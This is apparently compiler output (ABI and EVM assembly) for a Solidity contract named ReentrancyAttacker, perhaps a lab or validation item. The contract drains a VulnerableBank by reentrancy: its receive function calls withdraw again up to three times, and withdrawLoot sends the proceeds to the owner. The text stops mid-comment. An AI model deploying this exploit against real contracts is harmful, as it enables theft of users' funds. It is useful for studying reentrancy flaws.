{
	"val57.sol": {
		"ReentrancyAttacker": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_target",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "address",
							"name": "attacker",
							"type": "address"
						}
					],
					"name": "AttackStarted",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "LootWithdrawn",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "attackNumber",
							"type": "uint256"
						}
					],
					"name": "Reentered",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "MAX_ATTACKS",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackCounter",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "depositToTarget",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "target",
					"outputs": [
						{
							"internalType": "contract VulnerableBank",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdrawLoot",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"val57.sol\":19497:22049  contract ReentrancyAttacker {... */\n  mstore(0x40, 0x80)\n    /* \"val57.sol\":20036:20154  constructor(address _target)... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"val57.sol\":20107:20114  _target */\n  dup1\n    /* \"val57.sol\":20083:20089  target */\n  0x00\n  0x00\n    /* \"val57.sol\":20083:20115  target = VulnerableBank(_target) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"val57.sol\":20136:20146  msg.sender */\n  caller\n    /* \"val57.sol\":20128:20133  owner */\n  0x01\n  0x00\n    /* \"val57.sol\":20128:20146  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"val57.sol\":20036:20154  constructor(address _target)... */\n  pop\n    /* \"val57.sol\":19497:22049  contract ReentrancyAttacker {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"val57.sol\":19497:22049  contract ReentrancyAttacker {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"val57.sol\":19497:22049  contract ReentrancyAttacker {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      gt\n      tag_10\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xb36303fe\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xd4b83992\n      eq\n      tag_8\n      jumpi\n      dup1\n      0xf2433f90\n      eq\n      tag_9\n      jumpi\n      jump(tag_2)\n    tag_10:\n      dup1\n      0x2631a7c6\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x64bf5dcb\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"val57.sol\":21272:21279  1 ether */\n      0x0de0b6b3a7640000\n        /* \"val57.sol\":21253:21259  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"val57.sol\":21245:21268  address(target).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"val57.sol\":21245:21279  address(target).balance >= 1 ether */\n      lt\n      iszero\n        /* \"val57.sol\":21245:21336  address(target).balance >= 1 ether... */\n      dup1\n      iszero\n      tag_13\n      jumpi\n      pop\n        /* \"val57.sol\":19831:19832  3 */\n      0x03\n        /* \"val57.sol\":21309:21322  attackCounter */\n      sload(0x02)\n        /* \"val57.sol\":21309:21336  attackCounter < MAX_ATTACKS */\n      lt\n        /* \"val57.sol\":21245:21336  address(target).balance >= 1 ether... */\n    tag_13:\n        /* \"val57.sol\":21227:21587  if (... */\n      iszero\n      tag_14\n      jumpi\n        /* \"val57.sol\":21370:21394  Reentered(attackCounter) */\n      0xfe490e4ff15fdf52613fd81ee11eb3c5e4480db700591894a5dec8ecb498bbc7\n        /* \"val57.sol\":21380:21393  attackCounter */\n      sload(0x02)\n        /* \"val57.sol\":21370:21394  Reentered(attackCounter) */\n      mload(0x40)\n      tag_15\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"val57.sol\":21411:21424  attackCounter */\n      0x02\n      0x00\n        /* \"val57.sol\":21411:21426  attackCounter++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_17\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"val57.sol\":21551:21557  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"val57.sol\":21551:21566  target.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"val57.sol\":21567:21574  1 ether */\n      0x0de0b6b3a7640000\n        /* \"val57.sol\":21551:21575  target.withdraw(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_21\n      jumpi\n      revert(0x00, 0x00)\n    tag_21:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_23:\n      pop\n      pop\n      pop\n      pop\n        /* \"val57.sol\":21227:21587  if (... */\n    tag_14:\n        /* \"val57.sol\":19497:22049  contract ReentrancyAttacker {... */\n      stop\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"val57.sol\":19712:19740  uint256 public attackCounter */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_24\n      jumpi\n      revert(0x00, 0x00)\n    tag_24:\n      pop\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      tag_27\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"val57.sol\":20323:20516  function depositToTarget()... */\n    tag_4:\n      tag_28\n      tag_29\n      jump\t// in\n    tag_28:\n      stop\n        /* \"val57.sol\":19643:19663  address public owner */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_30\n      jumpi\n      revert(0x00, 0x00)\n    tag_30:\n      pop\n      tag_31\n      tag_32\n      jump\t// in\n    tag_31:\n      mload(0x40)\n      tag_33\n      swap2\n      swap1\n      tag_34\n      jump\t// in\n    tag_33:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"val57.sol\":20678:20867  function attack()... */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_35\n      jumpi\n      revert(0x00, 0x00)\n    tag_35:\n      pop\n      tag_36\n      tag_37\n      jump\t// in\n    tag_36:\n      stop\n        /* \"val57.sol\":19793:19832  uint256 public constant MAX_ATTACKS = 3 */\n    tag_7:\n      callvalue\n      dup1\n      iszero\n      tag_38\n      jumpi\n      revert(0x00, 0x00)\n    tag_38:\n      pop\n      tag_39\n      tag_40\n      jump\t// in\n    tag_39:\n      mload(0x40)\n      tag_41\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_41:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"val57.sol\":19575:19603  VulnerableBank public target */\n    tag_8:\n      callvalue\n      dup1\n      iszero\n      tag_42\n      jumpi\n      revert(0x00, 0x00)\n    tag_42:\n      pop\n      tag_43\n      tag_44\n      jump\t// in\n    tag_43:\n      mload(0x40)\n      tag_45\n      swap2\n      swap1\n      tag_46\n      jump\t// in\n    tag_45:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"val57.sol\":21763:22046  function withdrawLoot()... */\n    tag_9:\n      callvalue\n      dup1\n      iszero\n      tag_47\n      jumpi\n      revert(0x00, 0x00)\n    tag_47:\n      pop\n      tag_48\n      tag_49\n      jump\t// in\n    tag_48:\n      stop\n        /* \"val57.sol\":19712:19740  uint256 public attackCounter */\n    tag_26:\n      sload(0x02)\n      dup2\n      jump\t// out\n        /* \"val57.sol\":20323:20516  function depositToTarget()... */\n    tag_29:\n        /* \"val57.sol\":20474:20480  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"val57.sol\":20474:20488  target.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"val57.sol\":20496:20505  msg.value */\n      callvalue\n        /* \"val57.sol\":20474:20508  target.deposit{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_51\n      jumpi\n      revert(0x00, 0x00)\n    tag_51:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_53\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_53:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"val57.sol\":20323:20516  function depositToTarget()... */\n      jump\t// out\n        /* \"val57.sol\":19643:19663  address public owner */\n    tag_32:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"val57.sol\":20678:20867  function attack()... */\n    tag_37:\n        /* \"val57.sol\":20736:20761  AttackStarted(msg.sender) */\n      0xce47de3ada8bbc7bfa5119dcccfa33a2a79fc932531d5ece6a80a32547f0b7a3\n        /* \"val57.sol\":20750:20760  msg.sender */\n      caller\n        /* \"val57.sol\":20736:20761  AttackStarted(msg.sender) */\n      mload(0x40)\n      tag_55\n      swap2\n      swap1\n      tag_34\n      jump\t// in\n    tag_55:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"val57.sol\":20835:20841  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"val57.sol\":20835:20850  target.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"val57.sol\":20851:20858  1 ether */\n      0x0de0b6b3a7640000\n        /* \"val57.sol\":20835:20859  target.withdraw(1 ether) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_56\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_56:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_57\n      jumpi\n      revert(0x00, 0x00)\n    tag_57:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_59\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_59:\n      pop\n      pop\n      pop\n      pop\n        /* \"val57.sol\":20678:20867  function attack()... */\n      jump\t// out\n        /* \"val57.sol\":19793:19832  uint256 public constant MAX_ATTACKS = 3 */\n    tag_40:\n        /* \"val57.sol\":19831:19832  3 */\n      0x03\n        /* \"val57.sol\":19793:19832  uint256 public constant MAX_ATTACKS = 3 */\n      dup2\n      jump\t// out\n        /* \"val57.sol\":19575:19603  VulnerableBank public target */\n    tag_44:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"val57.sol\":21763:22046  function withdrawLoot()... */\n    tag_49:\n        /* \"val57.sol\":21859:21864  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"val57.sol\":21845:21864  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"val57.sol\":21845:21855  msg.sender */\n      caller\n        /* \"val57.sol\":21845:21864  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"val57.sol\":21823:21901  require(... */\n      tag_61\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_62\n      swap1\n      tag_63\n      jump\t// in\n    tag_62:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_61:\n        /* \"val57.sol\":21919:21955  LootWithdrawn(address(this).balance) */\n      0xda99fc855f3b7429eccee4147a58c05d64c5fa1bb47d52ce2605f36cbeba890c\n        /* \"val57.sol\":21933:21954  address(this).balance */\n      selfbalance\n        /* \"val57.sol\":21919:21955  LootWithdrawn(address(this).balance) */\n      mload(0x40)\n      tag_64\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_64:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"val57.sol\":21976:21981  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"val57.sol\":21968:21991  payable(owner).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"val57.sol\":21968:22038  payable(owner).transfer(... */\n      0x08fc\n        /* \"val57.sol\":22006:22027  address(this).balance */\n      selfbalance\n        /* \"val57.sol\":21968:22038  payable(owner).transfer(... */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_66\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_66:\n      pop\n        /* \"val57.sol\":21763:22046  function withdrawLoot()... */\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_67:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_68:\n        /* \"#utility.yul\":177:201   */\n      tag_87\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_67\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_16:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_89\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_68\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":442:622   */\n    tag_69:\n        /* \"#utility.yul\":490:567   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":487:488   */\n      0x00\n        /* \"#utility.yul\":480:568   */\n      mstore\n        /* \"#utility.yul\":587:591   */\n      0x11\n        /* \"#utility.yul\":584:585   */\n      0x04\n        /* \"#utility.yul\":577:592   */\n      mstore\n        /* \"#utility.yul\":611:615   */\n      0x24\n        /* \"#utility.yul\":608:609   */\n      0x00\n        /* \"#utility.yul\":601:616   */\n      revert\n        /* \"#utility.yul\":628:861   */\n    tag_18:\n        /* \"#utility.yul\":667:670   */\n      0x00\n        /* \"#utility.yul\":690:714   */\n      tag_92\n        /* \"#utility.yul\":708:713   */\n      dup3\n        /* \"#utility.yul\":690:714   */\n      tag_67\n      jump\t// in\n    tag_92:\n        /* \"#utility.yul\":681:714   */\n      swap2\n      pop\n        /* \"#utility.yul\":736:802   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":729:734   */\n      dup3\n        /* \"#utility.yul\":726:803   */\n      sub\n        /* \"#utility.yul\":723:826   */\n      tag_93\n      jumpi\n        /* \"#utility.yul\":806:824   */\n      tag_94\n      tag_69\n      jump\t// in\n    tag_94:\n        /* \"#utility.yul\":723:826   */\n    tag_93:\n        /* \"#utility.yul\":853:854   */\n      0x01\n        /* \"#utility.yul\":846:851   */\n      dup3\n        /* \"#utility.yul\":842:855   */\n      add\n        /* \"#utility.yul\":835:855   */\n      swap1\n      pop\n        /* \"#utility.yul\":628:861   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":867:970   */\n    tag_70:\n        /* \"#utility.yul\":930:937   */\n      0x00\n        /* \"#utility.yul\":959:964   */\n      dup2\n        /* \"#utility.yul\":948:964   */\n      swap1\n      pop\n        /* \"#utility.yul\":867:970   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":976:1036   */\n    tag_71:\n        /* \"#utility.yul\":1004:1007   */\n      0x00\n        /* \"#utility.yul\":1025:1030   */\n      dup2\n        /* \"#utility.yul\":1018:1030   */\n      swap1\n      pop\n        /* \"#utility.yul\":976:1036   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1042:1236   */\n    tag_72:\n        /* \"#utility.yul\":1118:1127   */\n      0x00\n        /* \"#utility.yul\":1151:1230   */\n      tag_98\n        /* \"#utility.yul\":1169:1229   */\n      tag_99\n        /* \"#utility.yul\":1178:1228   */\n      tag_100\n        /* \"#utility.yul\":1222:1227   */\n      dup5\n        /* \"#utility.yul\":1178:1228   */\n      tag_70\n      jump\t// in\n    tag_100:\n        /* \"#utility.yul\":1169:1229   */\n      tag_71\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":1151:1230   */\n      tag_67\n      jump\t// in\n    tag_98:\n        /* \"#utility.yul\":1138:1230   */\n      swap1\n      pop\n        /* \"#utility.yul\":1042:1236   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1242:1425   */\n    tag_73:\n        /* \"#utility.yul\":1355:1418   */\n      tag_102\n        /* \"#utility.yul\":1412:1417   */\n      dup2\n        /* \"#utility.yul\":1355:1418   */\n      tag_72\n      jump\t// in\n    tag_102:\n        /* \"#utility.yul\":1350:1353   */\n      dup3\n        /* \"#utility.yul\":1343:1419   */\n      mstore\n        /* \"#utility.yul\":1242:1425   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1431:1705   */\n    tag_20:\n        /* \"#utility.yul\":1550:1554   */\n      0x00\n        /* \"#utility.yul\":1588:1590   */\n      0x20\n        /* \"#utility.yul\":1577:1586   */\n      dup3\n        /* \"#utility.yul\":1573:1591   */\n      add\n        /* \"#utility.yul\":1565:1591   */\n      swap1\n      pop\n        /* \"#utility.yul\":1601:1698   */\n      tag_104\n        /* \"#utility.yul\":1695:1696   */\n      0x00\n        /* \"#utility.yul\":1684:1693   */\n      dup4\n        /* \"#utility.yul\":1680:1697   */\n      add\n        /* \"#utility.yul\":1671:1677   */\n      dup5\n        /* \"#utility.yul\":1601:1698   */\n      tag_73\n      jump\t// in\n    tag_104:\n        /* \"#utility.yul\":1431:1705   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1711:1837   */\n    tag_74:\n        /* \"#utility.yul\":1748:1755   */\n      0x00\n        /* \"#utility.yul\":1788:1830   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1781:1786   */\n      dup3\n        /* \"#utility.yul\":1777:1831   */\n      and\n        /* \"#utility.yul\":1766:1831   */\n      swap1\n      pop\n        /* \"#utility.yul\":1711:1837   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1843:1939   */\n    tag_75:\n        /* \"#utility.yul\":1880:1887   */\n      0x00\n        /* \"#utility.yul\":1909:1933   */\n      tag_107\n        /* \"#utility.yul\":1927:1932   */\n      dup3\n        /* \"#utility.yul\":1909:1933   */\n      tag_74\n      jump\t// in\n    tag_107:\n        /* \"#utility.yul\":1898:1933   */\n      swap1\n      pop\n        /* \"#utility.yul\":1843:1939   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1945:2063   */\n    tag_76:\n        /* \"#utility.yul\":2032:2056   */\n      tag_109\n        /* \"#utility.yul\":2050:2055   */\n      dup2\n        /* \"#utility.yul\":2032:2056   */\n      tag_75\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":2027:2030   */\n      dup3\n        /* \"#utility.yul\":2020:2057   */\n      mstore\n        /* \"#utility.yul\":1945:2063   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2069:2291   */\n    tag_34:\n        /* \"#utility.yul\":2162:2166   */\n      0x00\n        /* \"#utility.yul\":2200:2202   */\n      0x20\n        /* \"#utility.yul\":2189:2198   */\n      dup3\n        /* \"#utility.yul\":2185:2203   */\n      add\n        /* \"#utility.yul\":2177:2203   */\n      swap1\n      pop\n        /* \"#utility.yul\":2213:2284   */\n      tag_111\n        /* \"#utility.yul\":2281:2282   */\n      0x00\n        /* \"#utility.yul\":2270:2279   */\n      dup4\n        /* \"#utility.yul\":2266:2283   */\n      add\n        /* \"#utility.yul\":2257:2263   */\n      dup5\n        /* \"#utility.yul\":2213:2284   */\n      tag_76\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":2069:2291   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2297:2439   */\n    tag_77:\n        /* \"#utility.yul\":2347:2356   */\n      0x00\n        /* \"#utility.yul\":2380:2433   */\n      tag_113\n        /* \"#utility.yul\":2398:2432   */\n      tag_114\n        /* \"#utility.yul\":2407:2431   */\n      tag_115\n        /* \"#utility.yul\":2425:2430   */\n      dup5\n        /* \"#utility.yul\":2407:2431   */\n      tag_74\n      jump\t// in\n    tag_115:\n        /* \"#utility.yul\":2398:2432   */\n      tag_71\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":2380:2433   */\n      tag_74\n      jump\t// in\n    tag_113:\n        /* \"#utility.yul\":2367:2433   */\n      swap1\n      pop\n        /* \"#utility.yul\":2297:2439   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2445:2571   */\n    tag_78:\n        /* \"#utility.yul\":2495:2504   */\n      0x00\n        /* \"#utility.yul\":2528:2565   */\n      tag_117\n        /* \"#utility.yul\":2559:2564   */\n      dup3\n        /* \"#utility.yul\":2528:2565   */\n      tag_77\n      jump\t// in\n    tag_117:\n        /* \"#utility.yul\":2515:2565   */\n      swap1\n      pop\n        /* \"#utility.yul\":2445:2571   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2577:2725   */\n    tag_79:\n        /* 